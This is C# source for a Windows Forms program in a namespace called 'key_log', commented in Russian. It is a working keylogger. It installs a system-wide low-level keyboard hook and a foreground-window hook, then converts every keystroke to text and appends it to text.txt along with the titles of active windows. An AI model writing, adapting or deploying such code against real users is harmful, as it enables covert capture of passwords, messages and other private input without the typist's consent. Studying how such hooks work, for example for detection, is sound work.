using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Text.RegularExpressions;
using System.IO;
using System.Drawing.Imaging;

using System.Runtime.InteropServices;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;
using System.Diagnostics;

namespace key_log
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        // ... { GLOBAL HOOK }

        private static bool _capsLock;
        private static bool _shift;
        private static bool _numLock;
        private static bool _scrollLock;
        const int maxChars = 256;
        /*Библиотеки для хука клавиатурных событий*/
        [DllImport("user32.dll")]
        static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc callback, IntPtr hInstance, uint threadId);//установить хук

        [DllImport("user32.dll")]
        static extern bool UnhookWindowsHookEx(IntPtr hInstance);//завершить "отлов" события 

        [DllImport("user32.dll")]
        static extern IntPtr CallNextHookEx(IntPtr idHook, int nCode, int wParam, IntPtr lParam);//вызов следущего хука

        [DllImport("kernel32.dll")]
        static extern IntPtr LoadLibrary(string lpFileName);//загрузить библиотеку

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern uint GetCurrentThreadId();//получить id текущего потока

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        public static extern short GetKeyState(int keyCode);//получить состояние клавиши

        [DllImport("user32.dll")]
        public static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[]
             lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff,
             int cchBuff, uint wFlags, IntPtr dwhkl); //pwszBuff - символ, dwhkl - код кнопки

        [DllImport("user32.dll")]
        public static extern int GetWindowThreadProcessId(IntPtr hWnd, IntPtr lpdwProcessId);//получить id процесса в потоке

        [DllImport("user32.dll")]
        public static extern ushort GetKeyboardLayout(int threadId); // Метод для получения языка

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        const int WH_KEYBOARD_LL = 13; // Номер глобального хука на клавиатуру
        const int WM_KEYUP = 0x0101; // Сообщения нажатия клавиши
        /// <summary>
        /// ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        /// </summary>
        private LowLevelKeyboardProc Keyproc = hookProc;
        private static IntPtr Keyhook = IntPtr.Zero;
        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        /*Библиотеки для хука оконных событий*/

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
        
        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();
        /// <summary>
        /// ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        /// </summary>
        public const uint WINEVENT_OUTOFCONTEXT = 0;
        public const uint EVENT_SYSTEM_FOREGROUND = 3;
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("user32.dll")]
        public static extern IntPtr SetWinEventHook(uint eventMin, uint eventMax, IntPtr hmodWinEventProc, 
            WinEventProc lpfnWinEventProc, uint idProcess, uint idThread, uint dwFlags);

        public delegate void WinEventProc(IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, 
            int idChild, uint dwEventThread, uint dwmsEventTime);
        private static IntPtr Winhook = IntPtr.Zero;


        public void SetHook()
        {
            IntPtr hInstance = LoadLibrary("User32");
            Keyhook = SetWindowsHookEx(WH_KEYBOARD_LL, Keyproc, hInstance, 0);
            using (Process currentProcess = Process.GetCurrentProcess())
            using (ProcessModule currentModule = currentProcess.MainModule)
            {
                Winhook = SetWinEventHook(
                    EVENT_SYSTEM_FOREGROUND,
                    EVENT_SYSTEM_FOREGROUND,
                    GetModuleHandle(currentModule.ModuleName),
                    ActiveWindowsHook, 0, 0, WINEVENT_OUTOFCONTEXT);
            }
        }

        internal static void ActiveWindowsHook(
        IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime)
        {
            File.AppendAllText("text.txt", $"{Environment.NewLine}{GetActiveWindowTitle()}{Environment.NewLine}");
        }

        private static string GetActiveWindowTitle()
        {
            var buff = new StringBuilder(maxChars);
            var handle = GetForegroundWindow();

            if (GetWindowText(handle, buff, maxChars) > 0)
            {
                return buff.ToString();
            }
            return null;
        }
        public static void UnHook()
        {
            UnhookWindowsHookEx(Keyhook);
            UnhookWindowsHookEx(Winhook);
            
        }

        public static IntPtr hookProc(int code, IntPtr wParam, IntPtr lParam)
        {
            if (code >= 0 && wParam == (IntPtr)WM_KEYUP)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                //////ОБРАБОТКА НАЖАТИЯ
                SetKeysState();
                var saveText = GetSymbol((uint)vkCode);
                File.AppendAllText("text.txt", saveText);
               
            }
                return CallNextHookEx(Keyhook, code, (int)wParam, lParam);
        }

        private static void SetKeysState()
        {
            _capsLock = GetKeyState((int)Keys.CapsLock) != 0;
            _numLock = GetKeyState((int)Keys.NumLock) != 0;
            _scrollLock = GetKeyState((int)Keys.Scroll) != 0;
            _shift = GetKeyState((int)Keys.ShiftKey) != 0;
        }

        private static string GetSymbol(uint vkCode)
        {
            var buff = new StringBuilder(maxChars);
            var keyboardState = new byte[maxChars];
            var keyboard = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), IntPtr.Zero));
            ToUnicodeEx(vkCode, 0, keyboardState, buff, maxChars, 0, (IntPtr)keyboard);
            var buffSymbol = buff.ToString();
            var symbol = buffSymbol.Equals("\r") ? Environment.NewLine : buffSymbol;
            //если buffSymbol == переносу строки, то переносим, в противном случае пишем этот символ
            if (_capsLock ^ _shift)
                symbol = symbol.ToUpperInvariant();
            return symbol;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            // Устанавливаем хук
            SetHook();
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            UnHook();
        }
    }
}
